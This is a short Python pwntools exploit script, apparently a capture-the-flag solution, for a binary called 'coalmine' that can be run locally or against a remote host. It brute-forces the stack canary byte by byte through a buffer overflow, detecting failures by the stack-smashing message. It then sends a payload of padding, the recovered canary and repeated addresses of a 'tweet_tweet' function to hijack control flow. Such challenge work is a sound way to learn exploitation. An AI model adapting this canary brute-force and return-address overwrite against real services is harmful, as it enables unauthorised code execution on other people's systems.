#!/usr/bin/python3

from pwn import *
import sys
import string
import time

context.log_level = 'DEBUG'
#context.terminal = ['/usr/bin/termite', '-e']

e = ELF('./coalmine')

def getp():
    if len(sys.argv) == 3:
        p = remote(sys.argv[1], int(sys.argv[2]))
    else:
        p = process('./coalmine')
    return p

birdy = ''
for k in range(8):
    for c in string.ascii_uppercase:
        p = getp()
        p.sendlineafter(('>'), str(33+k))
        p.sendlineafter('>', 'A'*(32) + birdy + c)
        if b'***' not in p.recvall():
            p.close()
            birdy += c
            break
        p.close()

birdy = int(birdy.encode('utf-8').hex(), 16)
birdy = birdy.to_bytes(8, byteorder='big')
p = getp()
p.sendlineafter('>', "32")
#gdb.attach(p, 'b')
p.sendlineafter('>', b'A'*32 + birdy + p32(e.sym.tweet_tweet)*4)
